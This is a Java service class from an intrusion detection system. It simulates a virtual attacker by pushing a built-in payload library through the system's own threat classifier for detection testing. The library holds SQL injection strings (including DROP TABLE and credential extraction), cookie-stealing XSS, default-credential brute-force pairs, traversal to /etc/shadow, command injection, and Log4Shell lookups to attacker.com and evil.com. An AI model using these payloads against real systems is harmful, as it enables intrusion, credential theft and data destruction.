package com.cybersec.ids.simulation.service;

import com.cybersec.ids.service.AlertService;
import com.cybersec.ids.service.ThreatClassificationService;
import com.cybersec.ids.model.ThreatClassification;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Lazy;
import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Service;

import java.util.*;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Virtual Attacker — simulates a malicious device on a spoofed IP address.
 *
 * Unlike the basic IdsSimulationService (which only fires alerts), this simulator
 * pushes real attack payloads through the full ThreatClassificationService pipeline
 * so that:
 *   - The WAF/IDS/AI classifier actually processes them
 *   - Attack patterns are learned into the DB
 *   - IPs get blocked/rate-limited
 *   - Alerts fire to dashboard + Telegram
 *   - The user can watch the whole detection-response chain in action
 *
 * The attacker uses a virtual IP (default: 10.66.6.100) so it never conflicts
 * with your own localhost device.
 */
@Service
public class VirtualAttackerService {
    private static final Logger log = LoggerFactory.getLogger(VirtualAttackerService.class);

    private final ThreatClassificationService classificationService;
    private final AlertService alertService;

    private final AtomicBoolean active = new AtomicBoolean(false);
    private String attackerIp = "10.66.6.100";
    private String attackerName = "Virtual Attacker";
    private int attackIntervalMs = 3000;

    // Live attack log (last 50)
    private final CopyOnWriteArrayList<Map<String, Object>> attackLog = new CopyOnWriteArrayList<>();

    // ---- Attack Payloads Library ----
    private static final List<AttackPayload> ATTACK_LIBRARY = List.of(
        // SQL Injection attacks
        new AttackPayload("SQL_INJECTION", "/api/users?id=1", "id=1' OR 1=1 --", "GET",
            "Classic boolean-based SQL injection to bypass authentication"),
        new AttackPayload("SQL_INJECTION", "/api/search", "q=admin' UNION SELECT username,password FROM users--", "GET",
            "UNION-based SQLi to extract credentials from user table"),
        new AttackPayload("SQL_INJECTION", "/api/login", "username=admin&password=' OR ''='", "POST",
            "Authentication bypass via tautology injection"),
        new AttackPayload("SQL_INJECTION", "/api/products?sort=name", "sort=name; DROP TABLE users;--", "GET",
            "Stacked query injection attempting to drop table"),
        new AttackPayload("SQL_INJECTION", "/api/data", "filter=1; SELECT SLEEP(5)--", "GET",
            "Time-based blind SQL injection using SLEEP()"),

        // XSS attacks
        new AttackPayload("XSS", "/api/comments", "<script>alert(document.cookie)</script>", "POST",
            "Stored XSS payload to steal session cookies"),
        new AttackPayload("XSS", "/search", "q=<img onerror=alert('XSS') src=x>", "GET",
            "Reflected XSS via broken image tag with onerror handler"),
        new AttackPayload("XSS", "/profile/update", "bio=<iframe src=javascript:alert(1)>", "POST",
            "XSS via iframe injection with javascript: protocol"),
        new AttackPayload("XSS", "/api/feedback", "msg=<svg onload=eval(atob('YWxlcnQoMSk='))>", "POST",
            "Obfuscated XSS payload using SVG onload and base64"),

        // Brute Force login attempts
        new AttackPayload("BRUTE_FORCE", "/login", "username=admin&password=password123", "POST",
            "Brute force attempt #1: common password"),
        new AttackPayload("BRUTE_FORCE", "/login", "username=admin&password=admin", "POST",
            "Brute force attempt #2: default credentials"),
        new AttackPayload("BRUTE_FORCE", "/login", "username=root&password=toor", "POST",
            "Brute force attempt #3: root/toor combo"),
        new AttackPayload("BRUTE_FORCE", "/auth/signin", "username=admin&password=123456", "POST",
            "Brute force attempt #4: top password from leaked DB"),
        new AttackPayload("BRUTE_FORCE", "/login", "username=admin&password=letmein", "POST",
            "Brute force attempt #5: dictionary attack"),

        // Path Traversal / LFI
        new AttackPayload("PATH_TRAVERSAL", "/api/files?path=../../../../etc/passwd", "", "GET",
            "Directory traversal to read /etc/passwd"),
        new AttackPayload("PATH_TRAVERSAL", "/api/download?file=../../../etc/shadow", "", "GET",
            "LFI attempt targeting /etc/shadow for password hashes"),

        // Command Injection
        new AttackPayload("COMMAND_INJECTION", "/api/ping", "host=192.168.1.1; cat /etc/passwd", "POST",
            "OS command injection via ping utility to read passwd"),
        new AttackPayload("COMMAND_INJECTION", "/api/tools/dns", "domain=example.com | ls -la /", "POST",
            "Pipe-based command injection via DNS lookup"),

        // DDoS Flood simulation
        new AttackPayload("DDOS_FLOOD", "/", "", "GET",
            "High-frequency GET flood — DDoS simulation"),
        new AttackPayload("DDOS_FLOOD", "/api/health", "", "GET",
            "API endpoint flooding"),

        // Log4Shell / JNDI
        new AttackPayload("LOG4SHELL", "/api/search", "q=${jndi:ldap://attacker.com/exploit}", "GET",
            "Log4Shell JNDI injection via search parameter"),
        new AttackPayload("LOG4SHELL", "/api/login", "username=${jndi:ldap://evil.com/a}", "POST",
            "Log4Shell via login field"),

        // Unauthorized API Access
        new AttackPayload("UNAUTHORIZED_API", "/api/admin/users", "", "GET",
            "Accessing admin API endpoint without auth (no User-Agent)"),
        new AttackPayload("UNAUTHORIZED_API", "/api/internal/config", "", "GET",
            "Probing internal config endpoint")
    );

    @Autowired
    public VirtualAttackerService(@Lazy ThreatClassificationService classificationService,
                                  @Lazy AlertService alertService) {
        this.classificationService = classificationService;
        this.alertService = alertService;
    }

    // ===================== CONTROLS =====================

    public boolean isActive() { return active.get(); }
    public String getAttackerIp() { return attackerIp; }
    public String getAttackerName() { return attackerName; }
    public List<Map<String, Object>> getAttackLog() { return new ArrayList<>(attackLog); }

    public void setAttackerIp(String ip) { this.attackerIp = ip; }
    public void setAttackerName(String name) { this.attackerName = name; }
    public void setAttackInterval(int ms) { this.attackIntervalMs = Math.max(500, ms); }

    public void stop() {
        active.set(false);
        log.info("[ATTACKER] Virtual Attacker '{}' ({}) STOPPED.", attackerName, attackerIp);
    }

    // ===================== MAIN ATTACK LOOP =====================

    @Async
    public void startAttack() {
        if (active.getAndSet(true)) return;

        log.warn("[ATTACKER] ⚔️  Virtual Attacker '{}' ({}) LAUNCHED!", attackerName, attackerIp);
        Random rand = new Random();

        while (active.get()) {
            try {
                AttackPayload attack = ATTACK_LIBRARY.get(rand.nextInt(ATTACK_LIBRARY.size()));

                // For DDoS, send a burst of requests
                if ("DDOS_FLOOD".equals(attack.type)) {
                    for (int i = 0; i < 15 && active.get(); i++) {
                        fireAttack(attack, rand);
                        Thread.sleep(100); // Rapid fire
                    }
                } else if ("BRUTE_FORCE".equals(attack.type)) {
                    // Send multiple login attempts quickly
                    for (AttackPayload bf : ATTACK_LIBRARY.stream()
                            .filter(a -> "BRUTE_FORCE".equals(a.type)).toList()) {
                        if (!active.get()) break;
                        fireAttack(bf, rand);
                        Thread.sleep(300);
                    }
                } else {
                    fireAttack(attack, rand);
                }

                // Wait between attack waves
                int jitter = attackIntervalMs + rand.nextInt(2000);
                Thread.sleep(jitter);

            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
        }
        active.set(false);
    }

    // ===================== SINGLE ATTACK FIRE =====================

    /**
     * Fire a single attack into the classification pipeline.
     * This mimics what the IDS interceptor does for a real HTTP request,
     * but with the virtual attacker's spoofed IP.
     */
    private ThreatClassification fireAttack(AttackPayload attack, Random rand) {
        try {
            // Build the full payload string (URI + query + body)
            String fullPayload = attack.uri + " " + attack.payload;

            // Push through the AI classification service
            ThreatClassification tc = classificationService.classifyRequest(
                attackerIp,
                attack.uri,
                attack.payload.isEmpty() ? null : attack.payload,
                attack.method,
                "UNAUTHORIZED_API".equals(attack.type) ? null : "Mozilla/5.0 (VirtualAttacker/" + attackerName + ")",
                attack.payload
            );

            // Build log entry
            Map<String, Object> logEntry = new LinkedHashMap<>();
            logEntry.put("timestamp", java.time.LocalDateTime.now().toString());
            logEntry.put("attackerIp", attackerIp);
            logEntry.put("attackType", attack.type);
            logEntry.put("uri", attack.uri);
            logEntry.put("method", attack.method);
            logEntry.put("payload", attack.payload.length() > 100 ? attack.payload.substring(0, 100) + "..." : attack.payload);
            logEntry.put("description", attack.description);
            logEntry.put("classification", tc.getClassification().name());
            logEntry.put("confidence", String.format("%.2f", tc.getConfidenceScore()));
            logEntry.put("action", tc.getActionTaken().name());

            // Keep last 50 entries
            attackLog.add(logEntry);
            while (attackLog.size() > 50) attackLog.remove(0);

            log.info("[ATTACKER] {} → {} | {} | conf:{} | action:{}",
                attack.type, attack.uri, tc.getClassification(), 
                String.format("%.2f", tc.getConfidenceScore()), tc.getActionTaken());

            return tc;
        } catch (Exception e) {
            log.debug("[ATTACKER] Attack fire error: {}", e.getMessage());
            return null;
        }
    }

    // ===================== MANUAL ONE-SHOT ATTACKS =====================

    /**
     * Fire a specific attack type manually (from Swagger/UI).
     */
    public Map<String, Object> fireManualAttack(String type) {
        AttackPayload attack = ATTACK_LIBRARY.stream()
                .filter(a -> a.type.equalsIgnoreCase(type))
                .findFirst()
                .orElse(ATTACK_LIBRARY.get(0));

        ThreatClassification tc = fireAttack(attack, new Random());

        Map<String, Object> result = new LinkedHashMap<>();
        result.put("fired", true);
        result.put("attackerIp", attackerIp);
        result.put("attackType", attack.type);
        result.put("uri", attack.uri);
        result.put("payload", attack.payload);
        result.put("description", attack.description);
        
        if (tc != null) {
            result.put("classification", tc.getClassification().name());
            result.put("confidence", tc.getConfidenceScore());
            result.put("action", tc.getActionTaken().name());
        } else {
            result.put("error", "Classification failed internally");
        }
        return result;
    }

    /**
     * Fire a fully custom attack payload.
     */
    public Map<String, Object> fireCustomAttack(String uri, String payload, String method) {
        ThreatClassification tc = classificationService.classifyRequest(
            attackerIp, uri, payload, method,
            "Mozilla/5.0 (VirtualAttacker/Custom)", payload
        );

        Map<String, Object> result = new LinkedHashMap<>();
        result.put("fired", true);
        result.put("attackerIp", attackerIp);
        result.put("uri", uri);
        result.put("payload", payload);
        result.put("classification", tc.getClassification().name());
        result.put("confidence", tc.getConfidenceScore());
        result.put("action", tc.getActionTaken().name());
        return result;
    }

    // ===================== AVAILABLE ATTACK TYPES =====================

    public List<Map<String, String>> getAvailableAttacks() {
        List<Map<String, String>> list = new ArrayList<>();
        Set<String> seen = new LinkedHashSet<>();
        for (AttackPayload ap : ATTACK_LIBRARY) {
            if (seen.add(ap.type)) {
                list.add(Map.of(
                    "type", ap.type,
                    "sampleUri", ap.uri,
                    "description", ap.description
                ));
            }
        }
        return list;
    }

    // ===================== INNER CLASS =====================

    private static class AttackPayload {
        final String type;
        final String uri;
        final String payload;
        final String method;
        final String description;

        AttackPayload(String type, String uri, String payload, String method, String description) {
            this.type = type; this.uri = uri; this.payload = payload;
            this.method = method; this.description = description;
        }
    }
}
